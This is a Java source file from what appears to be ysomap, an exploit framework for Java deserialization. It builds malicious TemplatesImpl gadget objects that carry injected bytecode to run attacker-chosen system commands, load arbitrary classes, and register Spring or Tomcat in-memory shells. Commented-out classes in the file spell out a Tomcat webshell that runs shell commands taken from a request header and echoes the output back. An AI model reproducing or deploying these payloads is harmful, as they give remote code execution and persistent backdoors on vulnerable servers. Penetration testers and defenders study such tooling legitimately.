package ysomap.core.bullet.jdk;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import ysomap.common.annotation.*;
import ysomap.common.exception.PathNotFoundException;
import ysomap.core.bean.Bullet;
import ysomap.core.bullet.jdk.customTranslet.ShellInjectionPayload;
import ysomap.core.bullet.jdk.customTranslet.TomcatEchoPayload;
import ysomap.core.bullet.jdk.customTranslet.TomcatFilterAddPayload;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.*;
import java.util.Base64;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
@Authors({ Authors.WH1T3P1G })
public class TemplatesImplBullet extends Bullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "body", detail = "evil code (start with 'code:') or evil commands or file path store class bytecodes which used for spring shell(start with path:) or start with shell: will use spring shell now")
    private String body;

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private final String exception = "false";

    @Require(name = "tomcatEcho", type = "boolean", detail = "选择tomcat回显，默认为false")
    private final String tomcatEcho = "false";


    @Require(name = "shellInjection", type = "boolean", detail = "是否选择加载shell injection")
    private final String shellInjection = "false";

    @Require(name = "springRegister", type = "boolean", detail = "（需要先加载）是否选择注册spring controller")
    private final String springRegister = "false";

    @Require(name = "tomcatRequest", type = "boolean", detail = "是否选择加载tomcat内存shell并获取request和response")
    private final String tomcatRequest = "false";

    @Require(name = "tomcatRegister", type = "boolean", detail = "(需要先加载)是否选择注册tomcat内存shell")
    private final String tomcatRegister = "false";

    @Require(name = "routerPath", detail = "设置路由(spring shell需要)")
    private final String routerPath = "hahaha";

    @Require(name = "classname", detail = "设置加载的类名")
    private final String classname = shell.SpringShell.class.getName();


    @Override
    public Object getObject() throws Exception {
        if (body.startsWith("code:")) {// code mode
            body = body.substring(5);
        } else if (body.startsWith("path:")) {
            body = body.substring(5);
            File file = new File(body);
            if (!file.exists()) {
                throw new PathNotFoundException(body);
            } else {
                //读取base64 加密的字节流
                BufferedReader bfr = new BufferedReader(new FileReader(file));
                body = bfr.readLine();
            }
        }/*else if(body.startsWith("shell:")){
            classname=shell.SpringShell.class.getName();
            byte[] bytes=ClassFiles.makeClassWithSpringShell(classname,"");
            body=Base64.getEncoder().encodeToString(bytes);
        }*/ else {// system command execute mode
            if ("false".equals(exception)) {
                body = "java.lang.Runtime.getRuntime().exec(\"" +
                        body.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                        "\");";
            } else {
                body = PayloadHelper.makeExceptionPayload(body);
            }
        }
        initClazz();
        // create evil bytecodes
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        if ("false".equals(tomcatEcho)) {
            //inject spring shell
            if ("true".equals(shellInjection) && "false".equals(springRegister)) {
                //body here will be replaced with base64 encode class string
                cc = ClassFiles.makeClassFromExistClass(pool,
                        ShellInjectionPayload.class,
                        new Class<?>[]{abstractTranslet}
                );
                ClassFiles.insertStaticBlock(cc, "code=\"" + body + "\";\ncname=\"" + classname + "\";");
                //register spring controller
            } else if ("false".equals(shellInjection) && "true".equals(springRegister)) {
                cc = ClassFiles.makeClassFromExistClass(pool,
                        StubTransletPayload.class,
                        new Class<?>[]{abstractTranslet}
                );
                ClassFiles.insertStaticBlock(cc, PayloadHelper.makeRegisterSpringShell(routerPath, classname));
                //get tomcat request and response
            } else if ("true".equals(tomcatRequest) && "false".equals(tomcatRegister)) {
                cc = ClassFiles.makeClassFromExistClass(pool,
                        TomcatFilterAddPayload.class,
                        new Class<?>[]{abstractTranslet}
                );
                ClassFiles.insertStaticBlock(cc, "code=\"" + body + "\";\ncname=\"" + classname + "\";");
                //register tomcat shell
            } else if ("false".equals(tomcatRequest) && "true".equals(tomcatRegister)) {
                cc = ClassFiles.makeClassFromExistClass(pool,
                        StubTransletPayload.class,
                        new Class<?>[]{abstractTranslet}
                );
                ClassFiles.insertStaticBlock(cc, PayloadHelper.makeTomcatFilterRegister(classname));
            } else {
                cc = ClassFiles.makeClassFromExistClass(pool,
                        StubTransletPayload.class,
                        new Class<?>[]{abstractTranslet}
                );
                ClassFiles.insertStaticBlock(cc, body);
            }

            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        } else {
            cc = ClassFiles.makeClassFromExistClass(pool,
                    TomcatEchoPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        }

        byte[] bytecodes = cc.toBytecode();
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", "Pwnr");
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }


    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        }else{
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    /*public static class ShellInjectionPayload extends AbstractTranslet implements Serializable{

        private static String code="";//
        private static String cname="";//
        public ShellInjectionPayload(){
            try{
                byte[] bytes1=Base64.getDecoder().decode(code.getBytes());
                java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
                m.setAccessible(true);
                m.invoke(java.lang.ClassLoader.getSystemClassLoader(), new Object[]{cname,bytes1, 0, bytes1.length});
            }catch (Exception e){
                e.printStackTrace();
            }

        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }*/


    /*public static class TomcatFilterAddPayload extends AbstractTranslet implements Serializable{
        private static String code;
        private static String cname;
        public TomcatFilterAddPayload(){
            try{
                byte[] bytes1=Base64.getDecoder().decode(code.getBytes());
                java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
                m.setAccessible(true);
                m.invoke(java.lang.ClassLoader.getSystemClassLoader(), new Object[]{cname,bytes1, 0, bytes1.length});
                Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
                java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
                java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
                f.setAccessible(true);
                if (!f.getBoolean(null)) {
                    f.setBoolean(null, true);
                }

                //初始化 lastServicedRequest
                c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
                f = c.getDeclaredField("lastServicedRequest");
                modifiersField = f.getClass().getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
                f.setAccessible(true);
                if (f.get(null) == null) {
                    f.set(null, new ThreadLocal());
                }

                //初始化 lastServicedResponse
                f = c.getDeclaredField("lastServicedResponse");
                modifiersField = f.getClass().getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
                f.setAccessible(true);
                if (f.get(null) == null) {
                    f.set(null, new ThreadLocal());
                }

            }catch (Exception e){
                e.printStackTrace();
            }

        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }*/


    //tomcat 回显实现
    /*public static class TomcatEchoPayload extends AbstractTranslet implements Serializable {

        public TomcatEchoPayload() throws Exception {
            Object o;
            Object resp;
            String s;
            boolean done = false;
            //获取当前所有线程
            Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < ts.length; i++) {
                Thread t = ts[i];
                if (t == null) {
                    continue;
                }
                s = t.getName();
                if (!s.contains("exec") && s.contains("http")) {
                    o = getFV(t, "target");
                    //没处理
                    if (!(o instanceof Runnable)) {
                        continue;
                    }

                    //不知道
                    try {
                        o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                    } catch (Exception e) {
                        continue;
                    }

                    //最简单的实现，，如果Header中存在Testecho或者Testcmd就朝着全部threads中写入命令执行回显结果
                    java.util.List ps = (java.util.List) getFV(o, "processors");
                    for (int j = 0; j < ps.size(); j++) {
                        Object p = ps.get(j);
                        o = getFV(p, "req");
                        resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);
                        s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                        if (s != null && !s.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                            resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", s});
                            done = true;
                        }
                        s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});
                        if (s != null && !s.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                            String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                            writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                            done = true;
                        }
                        if ((s == null || s.isEmpty()) && done) {
                            writeBody(resp, System.getProperties().toString().getBytes());
                        }

                        if (done) {
                            break;
                        }
                    }
                    if (done) {
                        break;
                    }
                }
            }
        }

        //使用org.apache.tomcat.util.buf.ByteChunk的doWrite方法将回显内容写入resp对象内，如果找不到就用java.nio.ByteBuffer来实现
        private static void writeBody(Object resp, byte[] bs) throws Exception {
            Object o;
            Class clazz;
            try {
                clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                o = clazz.newInstance();
                clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class})
                        .invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});
                resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
            } catch (ClassNotFoundException e) {
                clazz = Class.forName("java.nio.ByteBuffer");
                o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
                resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
            } catch (NoSuchMethodException e) {
                clazz = Class.forName("java.nio.ByteBuffer");
                o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
                resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
            }
        }

        //获取object中的field(s)
        private static Object getFV(Object o, String s) throws Exception {
            java.lang.reflect.Field f = null;
            Class clazz = o.getClass();
            //按照继承树递归查找包含特定名字的field
            while (clazz != Object.class) {
                try {
                    f = clazz.getDeclaredField(s);
                    break;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (f == null) {
                throw new NoSuchFieldException(s);
            }
            f.setAccessible(true);
            return f.get(o);
        }



        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }*/
}
